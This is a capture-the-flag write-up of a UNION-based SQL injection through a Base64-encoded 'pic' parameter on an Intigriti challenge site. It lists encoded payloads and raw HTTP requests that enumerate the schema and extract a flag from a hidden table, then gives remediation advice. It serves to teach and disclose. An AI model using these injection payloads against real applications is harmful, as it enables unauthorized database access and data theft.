# SQL Injection via Base64-Encoded `pic` Parameter — Critter Gallery (Intigriti Challenge 0926)

**Vulnerability class:** SQL Injection (Unauthenticated, UNION-based)
**Target:** `challenge-0926.challenges.intigriti.io`

## Summary

The `animals pic` GET parameter on `/challenge.php` is Base64-decoded server-side and concatenated directly into a SQL query without sanitization or parameterization. This allows an unauthenticated attacker to inject arbitrary SQL, enumerate the full database schema, and exfiltrate data from tables unrelated to the application's intended functionality — including a hidden table, `secret_vault`.

## Vulnerable Endpoint

```
GET /challenge.php?pic=<base64>
```

## Discovery

Each critter tile on the gallery page links to a URL like:

```
/challenge.php?pic=Zm94
```

Decoding `Zm94` from Base64 gives `fox`. Every tile's `pic` value decodes to a plain critter name, indicating the parameter is Base64-encoded client-side / decoded server-side before being used in a backend query.

## Steps to Reproduce

### 1. Confirm the injection point

Base64-encode the payload:

```sql
' or '1'='1
```

→ `J29yICcxJz0nMQ==`

Request:

```
GET /challenge.php?pic=J29yICcxJz0nMQ==
```

**Result:** The response returns *every* critter's description concatenated together, and the page title reflects the raw injected string. This confirms the input breaks out of a quoted string in the backend SQL query.

### 2. Determine the number of columns

Payload: `' ORDER BY 1-- -` → normal response (no error).
Payload: `' ORDER BY 2-- -` → the application crashes completely (`HTTP 200`, `Content-Length: 0`, no HTML body at all).

**Result:** The underlying query selects exactly **1 column**.

### 3. Confirm UNION-based injection

Payload: `' UNION SELECT 1-- -`

**Result:** `1` is reflected in the page's description field, confirming a working 1-column UNION injection.

### 4. Enumerate the current database

Payload: `' UNION SELECT database()-- -`

**Result:** `critter_gallery`

### 5. Enumerate tables

Payload: `' UNION SELECT table_name FROM information_schema.tables-- -`

**Result (relevant entries):** `animals`, **`secret_vault`** (plus standard `information_schema`/`mysql` system tables).

### 6. Enumerate columns of `secret_vault`

Payload:

```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='secret_vault'-- -
```

**Result:** `id`, `note`

### 7. Extract the data

Payload: `' UNION SELECT note FROM secret_vault-- -`

**Result:**

```
INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

## Impact

An unauthenticated attacker can:

- Read arbitrary data from any table in the database (full data exfiltration).
- Enumerate the entire database schema via `information_schema`.
- Depending on the database account's privileges, potentially escalate further (e.g. `LOAD_FILE`, writing files, or stacked-query abuse).

## Root Cause

User-controlled input (the `pic` parameter, after Base64 decoding) is concatenated directly into a SQL query string instead of being passed as a bound/parameterized value.

## Remediation

- Use parameterized queries / prepared statements for all database access — never build SQL via string concatenation, even after decoding or transforming user input.
- Apply least-privilege database accounts; the web application's DB user should not have visibility into `information_schema` or unrelated tables such as `secret_vault`.
- Implement generic error handling so database errors return a safe response instead of a blank page that leaks internal application state.

## Proof of Concept

Raw HTTP requests/responses for each step above are available in [`/requests`](./requests) *(attach your exported Caido/Burp request logs here)*.

**1. Confirm the injection point `' or '1'='1` → `JyBvciAnMSc9JzE=`**

```
GET /challenge.php?pic=JyBvciAnMSc9JzE= HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```
**Result:** The response returns every critter's description concatenated 
together into a single block, and the page title reflects the raw injected 
string `' or '1'='1` instead of a real critter name — confirming the input 
breaks out of a quoted string in the backend SQL query.

---

**2. Determine number of columns `ORDER BY 1-- -` → `JyBPUkRFUiBCWSAxLS0gLQ==`** 

```
GET /challenge.php?pic=JyBPUkRFUiBCWSAxLS0gLQ== HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```

**Result (ORDER BY 1):**
Normal response — the query returns 0 rows for a non-existent critter name, 
but the page renders correctly.

**Result (ORDER BY 2):**
HTTP/1.1 200 OK
Content-Length: 0
The application returns a completely blank page (no HTML at all) — indicating 
the database threw an error because the underlying query only selects 1 
column, and the application has no error handling.

---

**3. Confirm UNION-based injection `' UNION SELECT 1 -- -` → `JyBVTklPTiBTRUxFQ1QgMSAtLSAt`**

```
GET /challenge.php?pic=JyBVTklPTiBTRUxFQ1QgMSAtLSAt HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```
**Result:**
`<div class="desc">1</div>`
The literal value `1` is reflected in the description field, confirming a 
working 1-column UNION-based SQL injection.

---

**4. Enumerate current database `' UNION SELECT database()-- -` → `JyBVTklPTiBTRUxFQ1QgZGF0YWJhc2UoKS0tIC0=`**

```
GET /challenge.php?pic=JyBVTklPTiBTRUxFQ1QgZGF0YWJhc2UoKS0tIC0= HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```
**Result:**
`<div class="desc">critter_gallery</div>`

---

**5. Enumerate tables `' UNION SELECT table_name FROM information_schema.tables-- -` → `JyBVTklPTiBTRUxFQ1QgdGFibGVfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMtLSAt`**

```
GET /challenge.php?pic=JyBVTklPTiBTRUxFQ1QgdGFibGVfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMtLSAt HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```
**Result:**
`<div class="desc">animals,secret_vault,...(standard information_schema/mysql tables)</div>`.
The table `secret_vault` stands out as unrelated to the application's 
intended functionality.

---

**6. Enumerate columns of `secret_vault`.**
- **`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='secret_vault'-- -` → `JyBVTklPTiBTRUxFQ1QgY29sdW1uX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdzZWNyZXRfdmF1bHQnLS0gLQ==`**

```
GET /challenge.php?pic=JyBVTklPTiBTRUxFQ1QgY29sdW1uX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdzZWNyZXRfdmF1bHQnLS0gLQ== HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```
**Result:**
`<div class="desc">id,note</div>`

---


**7. Extract the data `' UNION SELECT note FROM secret_vault-- -` → `JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=`**
```
GET /challenge.php?pic=JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0= HTTP/1.1
Host: challenge-0926.challenges.intigriti.io
```
**Result:**
`INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`

---
*Reported via the Intigriti responsible disclosure program.*
